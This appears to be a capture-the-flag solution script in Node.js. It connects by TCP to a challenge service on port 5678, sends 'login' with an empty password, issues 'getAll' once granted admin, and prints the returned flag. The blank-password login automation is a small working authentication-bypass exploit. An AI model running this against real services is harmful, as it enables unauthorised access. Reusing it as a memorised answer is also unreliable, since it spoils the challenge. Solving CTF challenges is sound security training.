#!/usr/bin/env node
var net = require('net');

var client = new net.Socket();

const host = process.argv[2];
console.error(`connecting to host ${host}:5678`);
client.connect(5678, host, function () {
    console.error('Connected');
});

client.on('data', function (data) {
    console.log('Received: ' + data);
    if (data.indexOf('use ctrl+C or ctrl+D to exit at any time') > -1) {
        client.write('login\n');
    }
    if (data.indexOf('Enter Password') > -1) {
        client.write('\n');
    }
    if (data.indexOf('You are now admin') > -1) {
        client.write('getAll\n');
    }
    if (data.indexOf('Flag:') > -1) {
        console.log(data);
        setTimeout(() => {
            client.destroy();
            process.exit(0);
        }, 1000);
    }
});

client.on('close', function () {
    console.error('Connection closed');
});


//client.destroy(); // kill client after server's response